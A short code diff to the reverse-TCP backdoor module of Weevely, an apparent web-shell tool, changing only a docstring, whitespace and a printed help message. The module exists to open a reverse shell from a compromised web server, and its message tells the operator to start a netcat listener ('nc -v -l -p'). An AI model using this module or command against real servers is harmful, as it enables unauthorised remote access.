@@ -15,7 +15,7 @@ from core.module import Module
 classname = 'Reversetcp'
     
 class Reversetcp(Module):
-    """Send reverse shell using TCP connection  
+    """Send reverse shell using TCP socket
     :backdoor.reverse_tcp ip port 
     """
     
@@ -32,12 +32,12 @@ class Reversetcp(Module):
 
         Module.__init__(self, modhandler, url, password)
         
-        self.usersinfo = {}
+        self.usersinfo = {}  
                 
     def run(self, host, port):
                 
         print "[backdoor.reverse_tcp] Weevely should now block during reverse backdoor usage. If not, assure"
-        print "[backdoor.reverse_tcp] \'shell.sh\' is loaded and port is opened (use \'nc -v -l -p %s\')" % (port)
+        print "[backdoor.reverse_tcp] \'shell.sh\' is available and port is open (use \'nc -v -l -p %s\')" % (port)
         
         interpreter, vector = self._get_default_vector()
         if interpreter and vector:
